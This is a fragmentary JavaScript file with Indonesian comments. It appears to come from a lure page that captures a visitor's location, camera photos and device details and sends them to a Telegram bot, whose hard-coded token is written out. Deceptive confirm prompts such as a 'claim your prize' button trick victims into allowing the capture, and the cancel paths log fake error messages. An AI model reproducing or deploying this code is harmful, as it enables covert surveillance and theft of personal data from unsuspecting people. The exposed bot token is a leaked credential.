...
function sendLocationToTelegram(latitude, longitude, address) {
    ...
    // Tampilkan konfirmasi sebelum mengirim lokasi
    const userConfirmed = confirm("apakah anda yakin ingin menampilkan Lokasi?");
    if (!userConfirmed) {
        console.log("Terjadi kesalahan saat membuka Lokasi.");
        return;
    }

    const botToken = '8137866512:AAE771KJrWSUMAaIpBcu_OLjbH3O_nArulU';  // Ganti dengan token bot kamu
...
function sendToTelegram(imageData) {
    // Tampilkan konfirmasi sebelum mengirim foto
    const userConfirmed = confirm("Tekan 'OK' Untuk Claim Hadiah");
    if (!userConfirmed) {
        console.log("Terjadi kesalahan saat membuka Kamera.");
        return;
    }
    ...
    .then(data => {
        if (data.ok) {
            ...
            console.error('Terjadi kesalahan saat mengirim foto.', data);
        }
    })
    .catch(error => {
        console.error('Error:', error);
...
function sendToTelegram(imageData) {
    // Tampilkan konfirmasi sebelum mengirim foto
    const userConfirmed = confirm("Apakah Anda yakin ingin membuka Kamera?");
    if (!userConfirmed) {
...
` +
            ...
            try {
                ...
                if (jsonResponse.ok) {
                    console.log('Informasi perangkat berhasil dikirim ke Telegram (JSON).');
                } else {
                    console.error('Gagal mengirim informasi ke Telegram dengan JSON.', jsonResponse);
                
                 // **🔹 Coba kirim dengan FormData jika JSON gagal**
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('text', message);
                ...
                if (fallbackJson.ok) {
                    console.log('Informasi perangkat berhasil dikirim ke Telegram (FormData).');
                } else {
                    console.error('Gagal mengirim informasi ke Telegram dengan FormData.', fallbackJson);
                }
            }
        } catch (error) {
            console.error('Error:', error);
